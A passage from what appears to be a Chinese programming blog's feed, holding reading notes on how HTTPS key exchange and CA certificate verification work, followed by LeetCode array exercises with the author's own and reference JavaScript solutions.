href="#第一版：使用对称加密" class="headerlink" title="第一版：使用对称加密"></a>第一版：使用对称加密</h4><p>对称加密是指加密和解密都使用的是相同的密钥。因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：</p><p><img src="https://i.loli.net/2021/06/15/EiBFkhUYQfmO3y2.jpg" alt="Snipaste_2021-06-15_16-37-12.jpg"></p><p>通过上图我们可以看出，HTTPS 首先要协商加解密方式，这个过程就是 HTTPS 建立安全连接的过程。为了让加密的密钥更加难以破解，我们让服务器和客户端同时决定密钥，具体过程如下：</p><ul><li>浏览器发送它所支持的加密套件列表和一个随机数 client-random，这里的加密套件是指加密的方法，加密套件列表就是指浏览器能支持多少种加密方法列表。</li><li>服务器会从加密套件列表中选取一个加密套件，然后还会生成一个随机数 service-random，并将 service-random 和加密套件列表返回给浏览器。</li><li>最后浏览器和服务器分别返回确认消息。</li></ul><p>这样浏览器端和服务器端都有相同的 client-random 和 service-random 了，然后它们再使用相同的方法将 client-random 和 service-random 混合起来生成一个密钥 master secret，有了密钥 master secret 和加密套件之后，双方就可以进行数据的加密传输了。</p><p>但是其中传输 client-random 和 service-random 的过程却是明文的，这意味着黑客也可以拿到协商的加密套件和双方的随机数，由于利用随机数合成密钥的算法是公开的，所以黑客拿到随机数之后，也可以合成密钥，这样数据依然可以被破解，那么黑客也就可以使用密钥来伪造或篡改数据了。</p><h4 id="第二版：使用非对称加密"><a href="#第二版：使用非对称加密" class="headerlink" title="第二版：使用非对称加密"></a>第二版：使用非对称加密</h4><p>非对称加密算法有 A、B 两把密钥，如果你用 A 密钥来加密，那么只能使用 B 密钥来解密；反过来，如果你要 B 密钥来加密，那么只能用 A 密钥来解密。</p><p>在 HTTPS 中，服务器会将其中的一个密钥通过明文的形式发送给浏览器，我们把这个密钥称为<strong>公钥</strong>，服务器自己留下的那个密钥称为<strong>私钥</strong>。顾名思义，<strong>公钥是每个人都能获取到的，而私钥只有服务器才能知道，不对任何人公开。</strong>下图是使用非对称加密改造的 HTTPS 协议：<img src="https://i.loli.net/2021/06/15/lWts4AkF5TRNS1X.jpg" alt="Snipaste_2021-06-15_16-39-33.jpg"></p><p>根据该图，我们来分析下使用非对称加密的请求流程。</p><ul><li>首先浏览器还是发送加密套件列表给服务器。</li><li>然后服务器会选择一个加密套件，不过和对称加密不同的是，使用非对称加密时服务器上需要有用于浏览器加密的公钥和服务器解密 HTTP 数据的私钥，由于公钥是给浏览器加密使用的，因此服务器会将加密套件和公钥一道发送给浏览器。</li><li>最后就是浏览器和服务器返回确认消息。</li></ul><p>这样浏览器端就有了服务器的公钥，在浏览器端向服务器端发送数据时，就可以使用该公钥来加密数据。由于公钥加密的数据只有私钥才能解密，所以即便黑客截获了数据和公钥，他也是无法使用公钥来解密数据的。这看上去似乎很完美，不过这种方式依然存在<strong>两个严重的问题：</strong></p><ul><li>第一个是<strong>非对称加密的效率太低</strong>。这会严重影响到加解密数据的速度，进而影响到用户打开页面的速度。</li><li>第二个是<strong>无法保证服务器发送给浏览器的数据安全</strong>。虽然浏览器端可以使用公钥来加密，但是服务器端只能采用私钥来加密，私钥加密只有公钥能解密，但黑客也是可以获取得到公钥的，这样就不能保证服务器端数据的安全了。</li></ul><h4 id="第三版：对称加密和非对称加密搭配使用"><a href="#第三版：对称加密和非对称加密搭配使用" class="headerlink" title="第三版：对称加密和非对称加密搭配使用"></a>第三版：对称加密和非对称加密搭配使用</h4><p>在传输数据阶段依然使用对称加密，但是对称加密的密钥我们采用非对称加密来传输。</p><p><img src="https://i.loli.net/2021/06/15/Q6Hcv57OfNe3L4V.jpg" alt="Snipaste_2021-06-15_16-40-58.jpg"></p><p>改造后的流程是这样的：</p><ul><li>首先浏览器向服务器发送对称加密套件列表、非对称加密套件列表和随机数 client-random；</li><li>服务器保存随机数 client-random，选择对称加密和非对称加密的套件，然后生成随机数 service-random，向浏览器发送选择的加密套件、service-random 和公钥；</li><li>浏览器保存公钥，并生成随机数 pre-master，然后利用公钥对 pre-master 加密，并向服务器发送加密后的数据；</li><li>最后服务器拿出自己的私钥，解密出 pre-master 数据，并返回确认消息。</li></ul><p>到此为止，服务器和浏览器就有了共同的 client-random、service-random 和 pre-master，然后服务器和浏览器会使用这三组随机数生成对称密钥，因为服务器和浏览器使用同一套方法来生成密钥，所以最终生成的密钥也是相同的。有了对称加密的密钥之后，双方就可以使用对称加密的方式来传输数据了。</p><p>需要特别注意的一点，<strong>pre-master 是经过公钥加密之后传输的，所以黑客无法获取到 pre-master，这样黑客就无法生成密钥，也就保证了黑客无法破解传输过程中的数据了。</strong></p><h4 id="第四版：添加数字证书"><a href="#第四版：添加数字证书" class="headerlink" title="第四版：添加数字证书"></a>第四版：添加数字证书</h4><p><strong>权威机构 CA</strong>（Certificate Authority），颁发<strong>数字证书</strong>（Digital Certificate)。对于浏览器来说，数字证书有两个作用：一个是通过数字证书向浏览器证明服务器的身份，另一个是数字证书里面包含了服务器公钥。</p><p>接下来我们看看含有数字证书的 HTTPS 的请求流程，你可以参考下图：</p><p><img src="https://i.loli.net/2021/06/15/QSE6I2dqFk51Hui.jpg" alt="Snipaste_2021-06-15_16-44-01.jpg"></p><p>相较于第三版的 HTTPS 协议，这里主要有两点改变：</p><ul><li>服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥正是包含在数字证书中的；</li><li>在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后续流程。</li></ul><p>通过引入数字证书，我们就实现了服务器的身份认证功能，这样即便黑客伪造了服务器，但是由于证书是没有办法伪造的，所以依然无法欺骗用户。</p><h3 id="数字证书的申请和验证"><a href="#数字证书的申请和验证" class="headerlink" title="数字证书的申请和验证"></a>数字证书的申请和验证</h3><p>通常的申请流程分以下几步：</p><ul><li>首先极客时间需要准备一套私钥和公钥，私钥留着自己使用；</li><li>然后极客时间向 CA 机构提交公钥、公司、站点等信息并等待认证，这个认证过程可能是收费的；</li><li>CA 通过线上、线下等多种渠道来验证极客时间所提供信息的真实性，如公司是否存在、企业是否合法、域名是否归属该企业等；</li><li>如信息审核通过，CA 会向极客时间签发认证的数字证书，包含了极客时间的公钥、组织信息、CA 的信息、有效时间、证书序列号等，这些信息都是明文的，同时包含一个 CA 生成的签名。</li></ul><p>最后一步数字签名的过程：首先 CA 使用 <strong>Hash 函数</strong>来计算极客时间提交的明文信息，并得出<strong>信息摘要</strong>；然后 CA 再使用它的私钥对信息摘要进行加密，<strong>加密后的密文就是 CA 颁给极客时间的数字签名</strong>。</p><p>浏览器接收到数字证书之后，会对数字证书进行验证：</p><ul><li>首先浏览器读取证书中相关的明文信息，采用 CA 签名时相同的 Hash 函数来计算并得到信息摘要 A；</li><li>然后再利用对应 CA 的公钥解密签名数据，得到信息摘要 B；</li><li>对比信息摘要 A 和信息摘要 B，如果一致，则可以确认证书是合法的，即证明了这个服务器是极客时间的；</li><li>同时浏览器还会验证证书相关的域名信息、有效时间等信息。</li></ul><p>在申请和使用证书的过程中，还需要注意以下三点：</p><ol><li>申请数字证书是不需要提供私钥的，要确保私钥永远只能由服务器掌握；</li><li>数字证书最核心的是 CA 使用它的私钥生成的数字签名；</li><li>内置 CA 对应的证书称为根证书，根证书是最权威的机构，它们自己为自己签名，我们把这称为自签名证书。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是&lt;a href=&quot;https://time.geekbang.org/column/intro/100033601&quot;&gt;极客时间——浏览</summary>
      
    
    
    
    <category term="阅读笔记" scheme="https://asura1211.github.io/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="浏览器工作原理" scheme="https://asura1211.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>【基本功】— — 数据结构</title>
    <link href="https://asura1211.github.io/2021/06/09/%E3%80%90%E5%9F%BA%E6%9C%AC%E5%8A%9F%E3%80%91%E2%80%94%20%E2%80%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <id>https://asura1211.github.io/2021/06/09/%E3%80%90%E5%9F%BA%E6%9C%AC%E5%8A%9F%E3%80%91%E2%80%94%20%E2%80%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</id>
    <published>2021-06-09T22:05:49.000Z</published>
    <updated>2021-12-07T14:11:45.710Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/10/14/FhG1sJ8bnKCSRXP.png" alt="数据结构副本.png"></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文记录的是 LeetCode 的题目和自己的刷题过程。</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="低效的“插入”和“删除”"><a href="#低效的“插入”和“删除”" class="headerlink" title="低效的“插入”和“删除”"></a>低效的“插入”和“删除”</h2><h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a><strong>插入</strong>操作</h3><p>假设数组的长度为 n，如果将一个数据插入到数组中的第 k 个位置。我们需将第 k～n 这部分的元素都顺序地往后挪一位。</p><p>如果在数组的末尾插入元素，那就不需要移动数据，时间复杂度为 O(1)。但如果在数组的开头插入元素，那所有的数据都需要依次往后移动一位，最坏时间复杂度是 O(n)。 因为每个位置插入元素的概率一样，所以平均时间复杂度为 (1+2+…n)/n=O(n)。</p><p><strong>还有一个简单的办法</strong>:直接将第 k 位的数据移到数组元素的最后，把新的元素直接放入第 k 个位置，这样时间复杂度就会降为 O(1)。</p><h3 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a><strong>删除操作</strong></h3><p>和插入类似，如果删除数组末尾的数据，则最好情况时间复杂度为 O(1)；如果删除开头的数据，则最坏情况时间复杂度为 O(n)；平均情况时间复杂度也为 O(n)。</p><p><strong>提高效率的方法：</strong>为了避免剩余数据多次搬移，我们可以先记录已经删除的数据。每次的删除操作并不是真正地搬移数据，只是记录数据已经被删除。当数组没有更多空间存储数据时，再触发执行一次真正的删除操作，这样就大大减少了删除操作导致的数据搬移。</p><h2 id="LeetCode1——两数之和（☆）（★）"><a href="#LeetCode1——两数之和（☆）（★）" class="headerlink" title="LeetCode1——两数之和（☆）（★）"></a>LeetCode1——两数之和（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/two-sum/">跳转地址</a></p><h3 id="自己的代码"><a href="#自己的代码" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i =<span class="number">0</span>;i&lt;=nums.length;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j=i+<span class="number">1</span>;j&lt;=nums.length;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i]+nums[j]==target)&#123;</span><br><span class="line">                <span class="keyword">var</span> result=[]</span><br><span class="line">                result[<span class="number">0</span>]=i</span><br><span class="line">                result[<span class="number">1</span>]=j</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC，但时间复杂度O(n^2)</p><h3 id="思路-amp-题解"><a href="#思路-amp-题解" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>利用 map</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        x = target - nums[i]</span><br><span class="line">        <span class="keyword">if</span>(map.has(x)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [map.get(x),i]</span><br><span class="line">        &#125;</span><br><span class="line">        map.set(nums[i],i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode167——两数之和-II-输入有序数组（☆）"><a href="#LeetCode167——两数之和-II-输入有序数组（☆）" class="headerlink" title="LeetCode167——两数之和 II - 输入有序数组（☆）"></a>LeetCode167——两数之和 II - 输入有序数组（☆）</h2><p><a href="https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted/">跳转地址</a></p><h3 id="自己的代码-1"><a href="#自己的代码-1" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">numbers, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = []</span><br><span class="line">  <span class="keyword">var</span> n,a</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numbers.length; i++)&#123;</span><br><span class="line">    n = target - numbers[i];</span><br><span class="line">    a=numbers.indexOf(n)</span><br><span class="line">    <span class="keyword">if</span> (a!=-<span class="number">1</span>) &#123;</span><br><span class="line">      arr.push(i+<span class="number">1</span>);</span><br><span class="line">      arr.push(a + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用了indexOf 果然错了。看到题解上有人说“印象深刻，现在还记得，第一看好简单，马上就用 indexOf 写了，然后肯定没通过，泪目。现在看，那时候不仅没注意复杂度的问题，而且逻辑上也有些问题，没有考虑 target 由 numbers 有两个相同是数组成的情况。”</p><p>害，涨涨经验把。</p><h3 id="思路1-amp-题解"><a href="#思路1-amp-题解" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><ul><li>声明一个数组 a 记录每个 numbers 中的元素与 target 直接的差值。</li><li>如果：x+y=target，那么 target-x=y，target-y=x</li><li>当遍历到满足要求的值直接返回，不然存贮对应的差值到 a 的对应索引位置</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span> (<span class="params">numbers, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = numbers.length; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = target - numbers[i]</span><br><span class="line">    <span class="keyword">if</span> (a[tmp] !== <span class="literal">undefined</span>) <span class="keyword">return</span> [a[tmp] + <span class="number">1</span>, i + <span class="number">1</span>]</span><br><span class="line">    a[numbers[i]] = i</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法好巧妙啊=</p><h3 id="思路2-amp-题解"><a href="#思路2-amp-题解" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>强行遍历：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function">(<span class="params">nums, target</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[j] === target) &#123;</span><br><span class="line">                <span class="keyword">return</span> [i + <span class="number">1</span>, j + <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路3-amp-题解"><a href="#思路3-amp-题解" class="headerlink" title="思路3&amp;题解"></a>思路3&amp;题解</h3><p>双指针：</p><ol><li>定义left、right</li><li>遍历过程若nums[left] + nums[right] &gt; target，太大了，要小一点，则right左移一位</li><li>遍历过程若nums[left] + nums[right] &lt; target，太小了，要大一点，则left右移一位</li><li>其余的情况就是nums[left] + nums[right] == target，return [left + 1, right + 1]即可</li><li>注意题目的index从1开始，所以return时+1即可</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function">(<span class="params">nums, target</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[left] + nums[right] &gt; target) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[left] + nums[right] &lt; target) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> [left + <span class="number">1</span>, right + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode724——寻找数组的中心索引（☆）"><a href="#LeetCode724——寻找数组的中心索引（☆）" class="headerlink" title="LeetCode724——寻找数组的中心索引（☆）"></a>LeetCode724——寻找数组的中心索引（☆）</h2><p><a href="https://leetcode-cn.com/problems/find-pivot-index/">跳转地址</a></p><h3 id="自己的代码-2"><a href="#自己的代码-2" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pivotIndex = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; nums.length) &#123;</span><br><span class="line">        <span class="keyword">var</span> sum1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> sum2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            sum1+=nums[i]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = index+<span class="number">1</span>; j &lt; nums.length; j++)&#123;</span><br><span class="line">            sum2+=nums[j]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum1 == sum2) &#123;</span><br><span class="line">            <span class="keyword">return</span> index;</span><br><span class="line">        &#125;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只想到用循环将前后sum求出来，然后判断。。</p><h3 id="思路-amp-题解-1"><a href="#思路-amp-题解-1" class="headerlink" title="思路&amp;题解"></a><strong>思路</strong>&amp;题解</h3><p>记数组的全部元素之和为 total，当遍历到第 i 个元素时，设其左侧元素之和为 sum，则其右侧元素之和为 total-num_si-sum。左右侧元素相等即为 sum=total-num_si-sum。即 2* sum+num_si=total。</p><p>当中心索引左侧或右侧没有元素时，即为零个项相加，称作「空和」（0）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pivotIndex = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> total = nums.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">2</span> * sum + nums[i] === total) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n)，其中 n为数组的长度。</p><h2 id="LeetCode88——合并两个有序数组（☆）（★★★）"><a href="#LeetCode88——合并两个有序数组（☆）（★★★）" class="headerlink" title="LeetCode88——合并两个有序数组（☆）（★★★）"></a>LeetCode88——合并两个有序数组（☆）（★★★）</h2><p><a href="https://leetcode-cn.com/problems/merge-sorted-array/">跳转地址</a></p><h3 id="思路1-amp-题解-1"><a href="#思路1-amp-题解-1" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>API大法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span>(<span class="params">nums1, m, nums2, n</span>) </span>&#123;</span><br><span class="line">  nums1.splice(m, n, ...nums2);</span><br><span class="line">  <span class="keyword">return</span> nums1.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>O（(m+n)log(m+n)）</p><h3 id="思路2-amp-题解-1"><a href="#思路2-amp-题解-1" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>双指针：在 nums1 后面不断插入当前最大值，直到 nums2 为空。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span> (<span class="params">nums1, m, nums2, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> insertPos = m + n - <span class="number">1</span>;</span><br><span class="line">    m--, n--;</span><br><span class="line">    <span class="keyword">while</span> (n &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        nums1[insertPos--] = nums1[m] &gt; nums2[n] ? nums1[m--] : nums2[n--];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>O（m+n）</p><h2 id="LeetCode56——合并区间（☆☆）（高频）"><a href="#LeetCode56——合并区间（☆☆）（高频）" class="headerlink" title="LeetCode56——合并区间（☆☆）（高频）"></a>LeetCode56——合并区间（☆☆）（高频）</h2><p><a href="https://leetcode-cn.com/problems/merge-intervals/">跳转地址</a></p><h3 id="自己的代码-3"><a href="#自己的代码-3" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span>(<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; intervals.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (intervals[i][<span class="number">1</span>] &lt; intervals[i + <span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">            arr.push(intervals[i])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            arr.push([intervals[i][<span class="number">0</span>],intervals[i+<span class="number">1</span>][<span class="number">1</span>]])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC，只会对传入的数组进行判断，如果能考虑到思路1那样，对merge的数组进行边界判断就好了。</p><h3 id="思路1-amp-题解-2"><a href="#思路1-amp-题解-2" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span> (<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 如果传递进来的数组长度为0 返回一个空数组</span></span><br><span class="line">    <span class="keyword">if</span> (intervals.length === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> []</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> res = [intervals[<span class="number">0</span>]]</span><br><span class="line">    intervals.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a[<span class="number">0</span>]-b[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">// 从原数组的第一个元素进行遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; intervals.length; i++) &#123;</span><br><span class="line">      <span class="comment">// 如果当前区间的左端点 大于 merge数组最后一个元素的右端点</span></span><br><span class="line">      <span class="keyword">if</span> (intervals[i][<span class="number">0</span>] &gt; res[res.length - <span class="number">1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="comment">// 说明这个数组可以直接放进merge数组中</span></span><br><span class="line">        res.push(intervals[i])</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// 说明有区间有交集 当前区间的左端点小于等于最后一个元素的右端点</span></span><br><span class="line">        <span class="comment">// 如果当前区间的右端点 大于 merge 最后一个右端点</span></span><br><span class="line">        <span class="keyword">if</span> (intervals[i][<span class="number">1</span>] &gt; res[res.length - <span class="number">1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">          <span class="comment">// 更新右端点为最大值</span></span><br><span class="line">          res[res.length - <span class="number">1</span>][<span class="number">1</span>] = intervals[i][<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(nlogn)，其中 n 为区间的数量。除去排序的开销，只需要一次线性扫描。</p><h3 id="思路2-amp-题解-2"><a href="#思路2-amp-题解-2" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span> (<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intervals.length === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    &#125;</span><br><span class="line">    intervals.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a[<span class="number">0</span>]-b[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">// 注意这里对同一个数组进行了读写操作</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;intervals.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals[i][<span class="number">1</span>]&gt;=intervals[i+<span class="number">1</span>][<span class="number">0</span>])&#123;</span><br><span class="line">          <span class="comment">// 根据规律 说明这个区间可以合并</span></span><br><span class="line">           <span class="keyword">const</span> data = [...intervals[i],...intervals[i+<span class="number">1</span>]]</span><br><span class="line">           <span class="keyword">const</span> item = [<span class="built_in">Math</span>.min(...data), <span class="built_in">Math</span>.max(...data)];</span><br><span class="line">            <span class="comment">// 在第i位置删除2个，插入新的item</span></span><br><span class="line">           intervals.splice(i, <span class="number">2</span>, item);</span><br><span class="line">           i--; <span class="comment">// 回退操作 看看新调整的区间是否可以跟后面的合并</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> intervals</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>需要很扎实的js基础。。。真的很难想到</p><h2 id="LeetCode2015——旋转矩阵（☆☆）（★★）"><a href="#LeetCode2015——旋转矩阵（☆☆）（★★）" class="headerlink" title="LeetCode2015——旋转矩阵（☆☆）（★★）"></a>LeetCode2015——旋转矩阵（☆☆）（★★）</h2><p><a href="https://leetcode-cn.com/problems/rotate-matrix-lcci/">跳转地址</a></p><h3 id="自己的代码-4"><a href="#自己的代码-4" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span> (<span class="params">matrix</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr=[]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; matrix.length; i++)&#123;</span><br><span class="line">    arr[i] = <span class="keyword">new</span> <span class="built_in">Array</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; matrix.length; j++)&#123;</span><br><span class="line">      arr[i][j] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; matrix.length; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; matrix.length; j++)&#123;</span><br><span class="line">      arr[j][matrix.length-<span class="number">1</span>-i] = matrix[i][j]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><del>感觉没毛病啊？在vscode里能跑出来，可为啥在lc里第一个都过不了呢？</del> </p><p>题目说了，不占用额外的内存空间！所以需要<strong>把新的数组复制到原数组</strong>。（然后就过了。。）</p><h3 